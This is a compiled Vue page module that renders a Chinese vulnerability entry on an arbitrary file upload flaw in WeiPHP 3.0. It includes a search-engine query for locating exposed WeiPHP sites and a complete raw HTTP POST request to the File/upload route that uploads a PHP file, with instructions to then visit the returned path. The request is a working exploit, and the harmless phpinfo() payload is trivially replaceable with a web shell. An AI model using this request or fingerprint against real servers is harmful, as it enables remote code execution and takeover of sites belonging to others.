import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{o as e,c as n,e as s}from"./app-58e4a7d6.js";const i={},t=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>WeiPHP3.0 session_id 存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>WeiPHP3.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;weiphp&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面标识</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162318569.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送请求包上传文件</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>POST /index.php?s=%2FHome%2FFile%2Fupload%2Fsession_id%2Fscevs8hub3m5ogla05a421hb42.html HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 831
Content-Type: multipart/form-data; boundary=------------------------e37a54d7d5380c9f
Accept-Encoding: gzip

--------------------------e37a54d7d5380c9f
Content-Disposition: form-data; name=&quot;download&quot;; filename=&quot;882176.php&quot;
Content-Type: application/octet-stream

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>e37a54d7d5380c9f<span class="token operator">--</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162318518.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>获取目录后访问回显的 path</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162318407.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),o=[t];function p(r,d){return e(),n("div",null,o)}const u=a(i,[["render",p],["__file","WeiPHP3.0 session_id 任意文件上传漏洞.html.vue"]]);export{u as default};
